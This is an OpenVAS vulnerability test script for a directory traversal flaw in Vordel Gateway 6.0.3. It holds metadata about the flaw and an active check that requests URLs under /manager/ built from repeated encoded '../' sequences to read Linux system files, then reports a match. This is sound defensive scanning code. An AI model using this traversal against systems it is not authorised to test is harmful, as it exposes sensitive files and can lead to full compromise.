###############################################################################
# OpenVAS Vulnerability Test
#
# Vordel Gateway Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103163");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-05-31 13:49:33 +0200 (Tue, 31 May 2011)");
  script_bugtraq_id(47975);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Vordel Gateway Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8090);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47975");
  script_xref(name:"URL", value:"https://web.archive.org/web/20130908024536/http://www.upsploit.com/index.php/advisories/view/UPS-2011-0023");

  script_tag(name:"solution", value:"Reportedly, the issue is fixed. However, Symantec has not confirmed
  this. Please contact the vendor for more information.");

  script_tag(name:"summary", value:"Vordel Gateway is prone to a directory-traversal vulnerability because
  it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker could exploit this vulnerability using directory-
  traversal strings (such as '../') to gain access to arbitrary files on the targeted system. This may
  result in the disclosure of sensitive information or lead to a complete compromise of the affected computer.");

  script_tag(name:"affected", value:"Vordel Gateway 6.0.3 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("misc_func.inc");

port = http_get_port( default:8090 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( find:"/", string:file, replace:"%2f" );
  url = string( "/manager/", crap( data:"..%2f", length:9*5 ), file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );
